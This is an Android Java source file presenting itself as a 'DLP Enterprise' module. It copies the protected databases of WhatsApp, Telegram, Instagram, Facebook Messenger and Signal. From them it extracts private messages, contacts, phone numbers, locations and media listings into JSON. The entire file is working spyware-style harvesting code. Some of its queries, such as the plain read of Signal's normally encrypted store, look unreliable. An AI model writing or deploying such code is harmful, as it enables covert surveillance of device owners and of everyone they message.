package com.athex.dlp.collectors;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * ATHEX DLP Enterprise - SocialMediaCollector
 * 
 * Comprehensive social media data extraction module.
 * Extracts data from major social media apps:
 * - WhatsApp (messages, contacts, media)
 * - Telegram (messages, channels, media)
 * - Instagram (DMs, profile data)
 * - Facebook Messenger
 * - Signal
 * - Viber
 * - Snapchat (limited)
 * 
 * @author ATHEX DLP Team
 * @version 2.0.0
 */
public class SocialMediaCollector {
    
    private static final String TAG = "ATHEX_SocialMediaCollector";
    
    // ============================================================
    // DATABASE PATHS
    // ============================================================
    
    private static final String WHATSAPP_DB = 
        "/data/data/com.whatsapp/databases/msgstore.db";
    private static final String WHATSAPP_WA_DB = 
        "/data/data/com.whatsapp/databases/wa.db";
    private static final String WHATSAPP_BUSINESS_DB = 
        "/data/data/com.whatsapp.w4b/databases/msgstore.db";
    
    private static final String TELEGRAM_DB = 
        "/data/data/org.telegram.messenger/files/cache4.db";
    private static final String TELEGRAM_BETA_DB = 
        "/data/data/org.telegram.messenger.beta/files/cache4.db";
    
    private static final String INSTAGRAM_DB = 
        "/data/data/com.instagram.android/databases/direct.db";
    
    private static final String FACEBOOK_DB = 
        "/data/data/com.facebook.orca/databases/threads_db2";
    
    private static final String SIGNAL_DB = 
        "/data/data/org.thoughtcrime.securesms/databases/signal.db";
    
    // Media paths
    private static final String WHATSAPP_MEDIA = "/sdcard/WhatsApp/Media/";
    private static final String TELEGRAM_MEDIA = "/sdcard/Telegram/";
    private static final String INSTAGRAM_MEDIA = "/sdcard/Instagram/";
    
    // ============================================================
    // INSTANCE VARIABLES
    // ============================================================
    
    private final Context context;
    private final ExecutorService executor;
    private final Handler mainHandler;
    
    // Options
    private boolean includeWhatsApp = true;
    private boolean includeTelegram = true;
    private boolean includeInstagram = false;
    private boolean includeFacebook = false;
    private boolean includeSignal = false;
    private boolean includeMedia = false;
    private boolean includeContacts = true;
    private int maxMessages = 500;
    private int maxContacts = 200;
    
    // Statistics
    private int whatsappMessages = 0;
    private int telegramMessages = 0;
    private int instagramMessages = 0;
    private int facebookMessages = 0;
    private int signalMessages = 0;
    private int totalContacts = 0;
    private int totalMedia = 0;
    private int appsFound = 0;
    private long collectionStartTime = 0;
    
    // Callbacks
    private CollectionCallback callback;
    
    // ============================================================
    // INTERFACES
    // ============================================================
    
    public interface CollectionCallback {
        void onCollectionStarted();
        void onAppFound(String appName);
        void onProgressUpdate(String appName, int messagesFound);
        void onCollectionComplete(JSONObject result, SocialStats stats);
        void onCollectionError(String error);
    }
    
    public static class SocialStats {
        public int appsFound;
        public int whatsappMessages;
        public int telegramMessages;
        public int instagramMessages;
        public int facebookMessages;
        public int signalMessages;
        public int totalContacts;
        public int totalMedia;
        public long durationMs;
        
        @Override
        public String toString() {
            return String.format(Locale.getDefault(),
                "Apps: %d | WA: %d | TG: %d | IG: %d | FB: %d | Signal: %d | " +
                "Contacts: %d | Media: %d",
                appsFound, whatsappMessages, telegramMessages, instagramMessages,
                facebookMessages, signalMessages, totalContacts, totalMedia
            );
        }
    }
    
    // ============================================================
    // CONSTRUCTOR
    // ============================================================
    
    public SocialMediaCollector(Context context) {
        this.context = context.getApplicationContext();
        this.executor = Executors.newSingleThreadExecutor();
        this.mainHandler = new Handler(Looper.getMainLooper());
    }
    
    // ============================================================
    // CONFIGURATION
    // ============================================================
    
    public SocialMediaCollector setIncludeWhatsApp(boolean include) {
        this.includeWhatsApp = include;
        return this;
    }
    
    public SocialMediaCollector setIncludeTelegram(boolean include) {
        this.includeTelegram = include;
        return this;
    }
    
    public SocialMediaCollector setIncludeInstagram(boolean include) {
        this.includeInstagram = include;
        return this;
    }
    
    public SocialMediaCollector setIncludeFacebook(boolean include) {
        this.includeFacebook = include;
        return this;
    }
    
    public SocialMediaCollector setIncludeSignal(boolean include) {
        this.includeSignal = include;
        return this;
    }
    
    public SocialMediaCollector setIncludeMedia(boolean include) {
        this.includeMedia = include;
        return this;
    }
    
    public SocialMediaCollector setMaxMessages(int max) {
        this.maxMessages = Math.max(10, Math.min(max, 5000));
        return this;
    }
    
    public SocialMediaCollector setCallback(CollectionCallback callback) {
        this.callback = callback;
        return this;
    }
    
    // ============================================================
    // MAIN COLLECTION
    // ============================================================
    
    public void collect() {
        executor.execute(() -> {
            try {
                collectionStartTime = System.currentTimeMillis();
                resetStats();
                notifyCollectionStarted();
                
                JSONObject result = new JSONObject();
                
                // WhatsApp
                if (includeWhatsApp) {
                    JSONObject whatsapp = collectWhatsApp();
                    if (whatsapp != null && whatsapp.length() > 0) {
                        result.put("whatsapp", whatsapp);
                        appsFound++;
                        notifyAppFound("WhatsApp");
                    }
                }
                
                // Telegram
                if (includeTelegram) {
                    JSONObject telegram = collectTelegram();
                    if (telegram != null && telegram.length() > 0) {
                        result.put("telegram", telegram);
                        appsFound++;
                        notifyAppFound("Telegram");
                    }
                }
                
                // Instagram
                if (includeInstagram) {
                    JSONObject instagram = collectInstagram();
                    if (instagram != null && instagram.length() > 0) {
                        result.put("instagram", instagram);
                        appsFound++;
                        notifyAppFound("Instagram");
                    }
                }
                
                // Facebook Messenger
                if (includeFacebook) {
                    JSONObject facebook = collectFacebook();
                    if (facebook != null && facebook.length() > 0) {
                        result.put("facebook_messenger", facebook);
                        appsFound++;
                        notifyAppFound("Facebook Messenger");
                    }
                }
                
                // Signal
                if (includeSignal) {
                    JSONObject signal = collectSignal();
                    if (signal != null && signal.length() > 0) {
                        result.put("signal", signal);
                        appsFound++;
                        notifyAppFound("Signal");
                    }
                }
                
                result.put("apps_found", appsFound);
                result.put("timestamp", System.currentTimeMillis());
                
                SocialStats stats = buildStats();
                stats.durationMs = System.currentTimeMillis() - collectionStartTime;
                
                Log.i(TAG, "Collection complete: " + stats.toString());
                notifyCollectionComplete(result, stats);
                
            } catch (Exception e) {
                Log.e(TAG, "Collection error: " + e.getMessage(), e);
                notifyError("Collection failed: " + e.getMessage());
            }
        });
    }
    
    // ============================================================
    // WHATSAPP EXTRACTION
    // ============================================================
    
    private JSONObject collectWhatsApp() {
        JSONObject whatsapp = new JSONObject();
        
        try {
            // Try regular WhatsApp
            String dbPath = WHATSAPP_DB;
            File dbFile = new File(dbPath);
            
            if (!dbFile.exists()) {
                // Try WhatsApp Business
                dbPath = WHATSAPP_BUSINESS_DB;
                dbFile = new File(dbPath);
            }
            
            if (!dbFile.exists()) {
                return null;
            }
            
            Log.i(TAG, "Found WhatsApp database: " + dbPath);
            
            File tempDb = copyDatabase(dbFile);
            if (tempDb == null) return null;
            
            SQLiteDatabase db = null;
            
            try {
                db = SQLiteDatabase.openDatabase(
                    tempDb.getAbsolutePath(), null, SQLiteDatabase.OPEN_READONLY
                );
                
                // Extract messages
                JSONArray messages = extractWhatsAppMessages(db);
                if (messages.length() > 0) {
                    whatsapp.put("messages", messages);
                    whatsapp.put("message_count", messages.length());
                    whatsappMessages = messages.length();
                    
                    notifyProgress("WhatsApp", messages.length());
                }
                
                // Extract contacts
                if (includeContacts) {
                    JSONArray contacts = extractWhatsAppContacts();
                    if (contacts.length() > 0) {
                        whatsapp.put("contacts", contacts);
                        whatsapp.put("contact_count", contacts.length());
                        totalContacts += contacts.length();
                    }
                }
                
                // Extract media files
                if (includeMedia) {
                    JSONArray media = extractWhatsAppMedia();
                    if (media.length() > 0) {
                        whatsapp.put("media", media);
                        whatsapp.put("media_count", media.length());
                        totalMedia += media.length();
                    }
                }
                
            } finally {
                if (db != null && db.isOpen()) db.close();
                tempDb.delete();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting WhatsApp: " + e.getMessage());
        }
        
        return whatsapp.length() > 0 ? whatsapp : null;
    }
    
    /**
     * Extract WhatsApp messages
     */
    private JSONArray extractWhatsAppMessages(SQLiteDatabase db) {
        JSONArray messages = new JSONArray();
        Cursor cursor = null;
        
        try {
            cursor = db.rawQuery(
                "SELECT " +
                "  m._id, " +
                "  m.key_remote_jid, " +
                "  m.key_from_me, " +
                "  m.data, " +
                "  m.timestamp, " +
                "  m.received_timestamp, " +
                "  m.media_url, " +
                "  m.media_mime_type, " +
                "  m.media_size, " +
                "  m.media_name, " +
                "  m.latitude, " +
                "  m.longitude, " +
                "  m.status, " +
                "  c.display_name " +
                "FROM messages m " +
                "LEFT JOIN chat c ON m.key_remote_jid = c.jid " +
                "ORDER BY m.timestamp DESC " +
                "LIMIT " + maxMessages,
                null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        JSONObject message = new JSONObject();
                        
                        message.put("id", cursor.getLong(0));
                        
                        // Chat JID (phone number or group ID)
                        String jid = cursor.getString(1);
                        message.put("chat_jid", jid != null ? jid : "");
                        message.put("chat_id", extractChatId(jid));
                        
                        // Direction
                        int fromMe = cursor.getInt(2);
                        message.put("from_me", fromMe == 1);
                        message.put("direction", fromMe == 1 ? "sent" : "received");
                        
                        // Content
                        String content = cursor.getString(3);
                        message.put("content", content != null ? content : "");
                        message.put("content_length", content != null ? content.length() : 0);
                        
                        // Timestamps
                        long timestamp = cursor.getLong(4);
                        message.put("timestamp", timestamp);
                        message.put("timestamp_formatted", formatTimestamp(timestamp / 1000));
                        
                        long receivedTimestamp = cursor.getLong(5);
                        if (receivedTimestamp > 0) {
                            message.put("received_timestamp", receivedTimestamp);
                        }
                        
                        // Media
                        String mediaUrl = cursor.getString(6);
                        message.put("has_media", mediaUrl != null);
                        if (mediaUrl != null) {
                            message.put("media_url", mediaUrl);
                            message.put("media_type", cursor.getString(7));
                            message.put("media_size", cursor.getLong(8));
                            message.put("media_name", cursor.getString(9));
                        }
                        
                        // Location
                        double latitude = cursor.getDouble(10);
                        double longitude = cursor.getDouble(11);
                        if (latitude != 0 || longitude != 0) {
                            JSONObject location = new JSONObject();
                            location.put("latitude", latitude);
                            location.put("longitude", longitude);
                            message.put("location", location);
                        }
                        
                        // Status
                        int status = cursor.getInt(12);
                        message.put("status", getWhatsAppStatus(status));
                        
                        // Contact name
                        String contactName = cursor.getString(13);
                        if (contactName != null) {
                            message.put("contact_name", contactName);
                        }
                        
                        // Message type
                        if (mediaUrl != null) {
                            message.put("type", "media");
                        } else if (latitude != 0 || longitude != 0) {
                            message.put("type", "location");
                        } else {
                            message.put("type", "text");
                        }
                        
                        messages.put(message);
                        
                    } catch (Exception e) {
                        Log.e(TAG, "Error extracting WhatsApp message: " + e.getMessage());
                    }
                } while (cursor.moveToNext());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error reading WhatsApp messages: " + e.getMessage());
        } finally {
            if (cursor != null && !cursor.isClosed()) cursor.close();
        }
        
        return messages;
    }
    
    /**
     * Extract WhatsApp contacts from wa.db
     */
    private JSONArray extractWhatsAppContacts() {
        JSONArray contacts = new JSONArray();
        
        try {
            File waDbFile = new File(WHATSAPP_WA_DB);
            if (!waDbFile.exists()) return contacts;
            
            File tempDb = copyDatabase(waDbFile);
            if (tempDb == null) return contacts;
            
            SQLiteDatabase db = SQLiteDatabase.openDatabase(
                tempDb.getAbsolutePath(), null, SQLiteDatabase.OPEN_READONLY
            );
            
            Cursor cursor = db.rawQuery(
                "SELECT jid, display_name, status, number, wa_name " +
                "FROM wa_contacts ORDER BY display_name ASC LIMIT " + maxContacts,
                null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject contact = new JSONObject();
                    contact.put("jid", cursor.getString(0));
                    contact.put("display_name", cursor.getString(1));
                    contact.put("status", cursor.getString(2));
                    contact.put("number", cursor.getString(3));
                    contact.put("wa_name", cursor.getString(4));
                    
                    // Extract phone number from JID
                    String jid = cursor.getString(0);
                    if (jid != null && jid.contains("@")) {
                        contact.put("phone", jid.split("@")[0]);
                    }
                    
                    contacts.put(contact);
                } while (cursor.moveToNext());
            }
            
            if (cursor != null) cursor.close();
            db.close();
            tempDb.delete();
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting WhatsApp contacts: " + e.getMessage());
        }
        
        return contacts;
    }
    
    /**
     * Extract WhatsApp media files
     */
    private JSONArray extractWhatsAppMedia() {
        JSONArray media = new JSONArray();
        
        try {
            String[] mediaDirs = {
                WHATSAPP_MEDIA + "WhatsApp Images",
                WHATSAPP_MEDIA + "WhatsApp Video",
                WHATSAPP_MEDIA + "WhatsApp Audio",
                WHATSAPP_MEDIA + "WhatsApp Documents",
                WHATSAPP_MEDIA + "WhatsApp Animated Gifs",
                WHATSAPP_MEDIA + "WhatsApp Stickers",
            };
            
            for (String dirPath : mediaDirs) {
                File dir = new File(dirPath);
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        for (File file : files) {
                            if (media.length() >= 200) break;
                            
                            JSONObject mediaFile = new JSONObject();
                            mediaFile.put("name", file.getName());
                            mediaFile.put("path", file.getAbsolutePath());
                            mediaFile.put("size", file.length());
                            mediaFile.put("last_modified", file.lastModified());
                            mediaFile.put("last_modified_formatted", 
                                formatTimestamp(file.lastModified()));
                            mediaFile.put("directory", dir.getName());
                            
                            media.put(mediaFile);
                        }
                    }
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting WhatsApp media: " + e.getMessage());
        }
        
        return media;
    }
    
    // ============================================================
    // TELEGRAM EXTRACTION
    // ============================================================
    
    private JSONObject collectTelegram() {
        JSONObject telegram = new JSONObject();
        
        try {
            String dbPath = TELEGRAM_DB;
            File dbFile = new File(dbPath);
            
            if (!dbFile.exists()) {
                dbPath = TELEGRAM_BETA_DB;
                dbFile = new File(dbPath);
            }
            
            if (!dbFile.exists()) return null;
            
            Log.i(TAG, "Found Telegram database: " + dbPath);
            
            File tempDb = copyDatabase(dbFile);
            if (tempDb == null) return null;
            
            SQLiteDatabase db = SQLiteDatabase.openDatabase(
                tempDb.getAbsolutePath(), null, SQLiteDatabase.OPEN_READONLY
            );
            
            // Extract messages
            JSONArray messages = extractTelegramMessages(db);
            if (messages.length() > 0) {
                telegram.put("messages", messages);
                telegram.put("message_count", messages.length());
                telegramMessages = messages.length();
                notifyProgress("Telegram", messages.length());
            }
            
            // Extract users/chats
            JSONArray chats = extractTelegramChats(db);
            if (chats.length() > 0) {
                telegram.put("chats", chats);
                telegram.put("chat_count", chats.length());
            }
            
            db.close();
            tempDb.delete();
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting Telegram: " + e.getMessage());
        }
        
        return telegram.length() > 0 ? telegram : null;
    }
    
    private JSONArray extractTelegramMessages(SQLiteDatabase db) {
        JSONArray messages = new JSONArray();
        Cursor cursor = null;
        
        try {
            cursor = db.rawQuery(
                "SELECT m.uid, m.did, m.date, m.message, m.type, " +
                "       u.first_name, u.last_name, u.username " +
                "FROM messages m " +
                "LEFT JOIN users u ON m.uid = u.uid " +
                "ORDER BY m.date DESC " +
                "LIMIT " + maxMessages,
                null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject message = new JSONObject();
                    message.put("uid", cursor.getLong(0));
                    message.put("dialog_id", cursor.getLong(1));
                    
                    long date = cursor.getLong(2);
                    message.put("date", date);
                    message.put("date_formatted", formatTimestamp(date));
                    
                    String text = cursor.getString(3);
                    message.put("text", text != null ? text : "");
                    
                    message.put("type", cursor.getInt(4));
                    
                    // User info
                    String firstName = cursor.getString(5);
                    String lastName = cursor.getString(6);
                    String username = cursor.getString(7);
                    
                    StringBuilder fullName = new StringBuilder();
                    if (firstName != null) fullName.append(firstName);
                    if (lastName != null) {
                        if (fullName.length() > 0) fullName.append(" ");
                        fullName.append(lastName);
                    }
                    
                    message.put("sender_name", fullName.toString());
                    if (username != null) message.put("username", username);
                    
                    messages.put(message);
                    
                } while (cursor.moveToNext());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting Telegram messages: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
        
        return messages;
    }
    
    private JSONArray extractTelegramChats(SQLiteDatabase db) {
        JSONArray chats = new JSONArray();
        Cursor cursor = null;
        
        try {
            cursor = db.rawQuery(
                "SELECT u.uid, u.first_name, u.last_name, u.username, " +
                "       u.phone, u.status " +
                "FROM users u " +
                "ORDER BY u.first_name ASC " +
                "LIMIT " + maxContacts,
                null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject chat = new JSONObject();
                    chat.put("uid", cursor.getLong(0));
                    
                    String firstName = cursor.getString(1);
                    if (firstName != null) chat.put("first_name", firstName);
                    
                    String lastName = cursor.getString(2);
                    if (lastName != null) chat.put("last_name", lastName);
                    
                    String username = cursor.getString(3);
                    if (username != null) chat.put("username", username);
                    
                    String phone = cursor.getString(4);
                    if (phone != null) chat.put("phone", phone);
                    
                    chat.put("status", cursor.getString(5));
                    
                    chats.put(chat);
                } while (cursor.moveToNext());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting Telegram chats: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
        
        return chats;
    }
    
    // ============================================================
    // INSTAGRAM EXTRACTION
    // ============================================================
    
    private JSONObject collectInstagram() {
        JSONObject instagram = new JSONObject();
        
        try {
            File dbFile = new File(INSTAGRAM_DB);
            if (!dbFile.exists()) return null;
            
            File tempDb = copyDatabase(dbFile);
            if (tempDb == null) return null;
            
            SQLiteDatabase db = SQLiteDatabase.openDatabase(
                tempDb.getAbsolutePath(), null, SQLiteDatabase.OPEN_READONLY
            );
            
            Cursor cursor = db.rawQuery(
                "SELECT thread_id, user_id, text, timestamp, " +
                "       sender_name " +
                "FROM messages " +
                "ORDER BY timestamp DESC " +
                "LIMIT " + maxMessages,
                null
            );
            
            JSONArray messages = new JSONArray();
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject message = new JSONObject();
                    message.put("thread_id", cursor.getString(0));
                    message.put("user_id", cursor.getString(1));
                    message.put("text", cursor.getString(2));
                    
                    long timestamp = cursor.getLong(3);
                    message.put("timestamp", timestamp);
                    message.put("timestamp_formatted", formatTimestamp(timestamp / 1000));
                    
                    message.put("sender_name", cursor.getString(4));
                    
                    messages.put(message);
                } while (cursor.moveToNext());
            }
            
            if (cursor != null) cursor.close();
            db.close();
            tempDb.delete();
            
            if (messages.length() > 0) {
                instagram.put("messages", messages);
                instagram.put("message_count", messages.length());
                instagramMessages = messages.length();
                notifyProgress("Instagram", messages.length());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting Instagram: " + e.getMessage());
        }
        
        return instagram.length() > 0 ? instagram : null;
    }
    
    // ============================================================
    // FACEBOOK MESSENGER EXTRACTION
    // ============================================================
    
    private JSONObject collectFacebook() {
        JSONObject facebook = new JSONObject();
        
        try {
            File dbFile = new File(FACEBOOK_DB);
            if (!dbFile.exists()) return null;
            
            File tempDb = copyDatabase(dbFile);
            if (tempDb == null) return null;
            
            SQLiteDatabase db = SQLiteDatabase.openDatabase(
                tempDb.getAbsolutePath(), null, SQLiteDatabase.OPEN_READONLY
            );
            
            Cursor cursor = db.rawQuery(
                "SELECT thread_key, msg_id, sender_id, text, timestamp_ms " +
                "FROM messages " +
                "ORDER BY timestamp_ms DESC " +
                "LIMIT " + maxMessages,
                null
            );
            
            JSONArray messages = new JSONArray();
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject message = new JSONObject();
                    message.put("thread_key", cursor.getString(0));
                    message.put("msg_id", cursor.getString(1));
                    message.put("sender_id", cursor.getString(2));
                    message.put("text", cursor.getString(3));
                    
                    long timestamp = cursor.getLong(4);
                    message.put("timestamp", timestamp);
                    message.put("timestamp_formatted", formatTimestamp(timestamp / 1000));
                    
                    messages.put(message);
                } while (cursor.moveToNext());
            }
            
            if (cursor != null) cursor.close();
            db.close();
            tempDb.delete();
            
            if (messages.length() > 0) {
                facebook.put("messages", messages);
                facebook.put("message_count", messages.length());
                facebookMessages = messages.length();
                notifyProgress("Facebook Messenger", messages.length());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting Facebook: " + e.getMessage());
        }
        
        return facebook.length() > 0 ? facebook : null;
    }
    
    // ============================================================
    // SIGNAL EXTRACTION
    // ============================================================
    
    private JSONObject collectSignal() {
        JSONObject signal = new JSONObject();
        
        try {
            File dbFile = new File(SIGNAL_DB);
            if (!dbFile.exists()) return null;
            
            File tempDb = copyDatabase(dbFile);
            if (tempDb == null) return null;
            
            SQLiteDatabase db = SQLiteDatabase.openDatabase(
                tempDb.getAbsolutePath(), null, SQLiteDatabase.OPEN_READONLY
            );
            
            Cursor cursor = db.rawQuery(
                "SELECT thread_id, sender_id, body, date_sent, date_received, " +
                "       type, read " +
                "FROM messages " +
                "ORDER BY date_sent DESC " +
                "LIMIT " + maxMessages,
                null
            );
            
            JSONArray messages = new JSONArray();
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject message = new JSONObject();
                    message.put("thread_id", cursor.getLong(0));
                    message.put("sender_id", cursor.getString(1));
                    message.put("body", cursor.getString(2));
                    
                    long dateSent = cursor.getLong(3);
                    message.put("date_sent", dateSent);
                    message.put("date_sent_formatted", formatTimestamp(dateSent / 1000));
                    
                    message.put("type", cursor.getInt(5));
                    message.put("read", cursor.getInt(6) == 1);
                    
                    messages.put(message);
                } while (cursor.moveToNext());
            }
            
            if (cursor != null) cursor.close();
            db.close();
            tempDb.delete();
            
            if (messages.length() > 0) {
                signal.put("messages", messages);
                signal.put("message_count", messages.length());
                signalMessages = messages.length();
                notifyProgress("Signal", messages.length());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting Signal: " + e.getMessage());
        }
        
        return signal.length() > 0 ? signal : null;
    }
    
    // ============================================================
    // UTILITY METHODS
    // ============================================================
    
    private File copyDatabase(File source) {
        try {
            File tempFile = File.createTempFile("athex_social_", ".db",
                context.getCacheDir());
            
            FileInputStream fis = new FileInputStream(source);
            FileOutputStream fos = new FileOutputStream(tempFile);
            
            byte[] buffer = new byte[8192];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                fos.write(buffer, 0, read);
            }
            
            fis.close();
            fos.close();
            
            return tempFile;
            
        } catch (IOException e) {
            Log.e(TAG, "Error copying database: " + e.getMessage());
            return null;
        }
    }
    
    private String extractChatId(String jid) {
        if (jid == null) return "";
        try {
            if (jid.contains("@")) {
                String[] parts = jid.split("@");
                if (parts[0].contains("-")) {
                    return parts[0]; // Group ID
                }
                return parts[0]; // Phone number
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting chat ID: " + e.getMessage());
        }
        return jid;
    }
    
    private String getWhatsAppStatus(int status) {
        switch (status) {
            case 0: return "received";
            case 1: return "delivered";
            case 2: return "read";
            case 3: return "played";
            default: return "unknown";
        }
    }
    
    private String formatTimestamp(long timestamp) {
        try {
            return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(new Date(timestamp));
        } catch (Exception e) {
            return String.valueOf(timestamp);
        }
    }
    
    private void resetStats() {
        whatsappMessages = 0;
        telegramMessages = 0;
        instagramMessages = 0;
        facebookMessages = 0;
        signalMessages = 0;
        totalContacts = 0;
        totalMedia = 0;
        appsFound = 0;
    }
    
    private SocialStats buildStats() {
        SocialStats stats = new SocialStats();
        stats.appsFound = appsFound;
        stats.whatsappMessages = whatsappMessages;
        stats.telegramMessages = telegramMessages;
        stats.instagramMessages = instagramMessages;
        stats.facebookMessages = facebookMessages;
        stats.signalMessages = signalMessages;
        stats.totalContacts = totalContacts;
        stats.totalMedia = totalMedia;
        return stats;
    }
    
    // ============================================================
    // CALLBACKS
    // ============================================================
    
    private void notifyCollectionStarted() {
        if (callback != null) {
            mainHandler.post(() -> callback.onCollectionStarted());
        }
    }
    
    private void notifyAppFound(String appName) {
        if (callback != null) {
            mainHandler.post(() -> callback.onAppFound(appName));
        }
    }
    
    private void notifyProgress(String appName, int messages) {
        if (callback != null) {
            mainHandler.post(() -> callback.onProgressUpdate(appName, messages));
        }
    }
    
    private void notifyCollectionComplete(JSONObject result, SocialStats stats) {
        if (callback != null) {
            mainHandler.post(() -> callback.onCollectionComplete(result, stats));
        }
    }
    
    private void notifyError(String error) {
        if (callback != null) {
            mainHandler.post(() -> callback.onCollectionError(error));
        }
    }
    
    public void shutdown() {
        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
        }
    }
}